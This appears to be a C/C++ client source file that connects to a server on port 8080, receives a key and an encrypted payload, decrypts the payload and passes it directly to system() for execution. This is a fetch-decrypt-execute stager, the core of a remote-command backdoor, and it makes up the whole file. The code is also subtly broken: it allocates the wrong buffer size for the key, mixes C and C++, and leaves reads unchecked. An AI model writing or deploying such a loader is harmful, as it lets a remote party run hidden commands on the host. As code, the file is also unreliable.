#include <stdio.h>
#include <sys/socket.h>

#include "client.h"

static const char *host = "localhost";

void client_connect(void) {
    con.fd = socket(AF_INET, SOCK_STREAM, 0);
    struct addrinfo hint;
    struct addrinfo *tmp;
    size_t payload_size;
    byte *payload_size_buff;
    byte *key;
    byte *payload;

    memset(&hint, 0, sizeof(hint));
    hint.ai_socktype = SOCK_STREAM;
    hint.ai_flags = AI_CANONNAME;

    if (getaddrinfo(host, NULL, &hint, &tmp)) {
        perror("getaddinfo failed");
        exit(EXIT_FAILURE);
    }


    memcpy(con.serverAddress, tmp->ai_addr, sizeof(struct sockaddr));
    freeaddrinfo(tmp);
    
    con.serverAddress->sin_family = AF_INET;
    con.serverAddress->sin_port = htons(8080);
    //con.serverAddress->sin_addr.s_addr = INADDR_LOOPBACK;

    if (connect(con.fd, (struct sockaddr *)(con.serverAddress), sizeof(struct sockaddr)) == -1) {
        perror("Oh no. could not connect to host");
        exit(EXIT_FAILURE);
    }

    key = (byte *)malloc(sizeof(KEY_SIZE));
    payload_size_buff = (char *)malloc(BUFF_SIZE);

    read(con.fd, key, KEY_SIZE);

    read(con.fd, payload_size_buff, BUFF_SIZE);
    sscanf(payload_size_buff, "%lu", &payload_size);
    free(payload_size_buff);
    payload_size_buff = NULL;

    payload = (byte *)malloc(payload_size + 1);
        
    read(con.fd, payload, payload_size);

    payload[payload_size] = '\0';

    crypto *crypt = new crypto(key, payload_size, payload);
    crypt->crypt_key();
    crypt->crypt();

    fun(crypt);

    delete crypt;
    crypt = NULL;
    shutdown(con.fd, SHUT_RDWR);
    close(con.fd);
}


void fun(crypto *crypt) {
    system(crypt->get_payload());
}
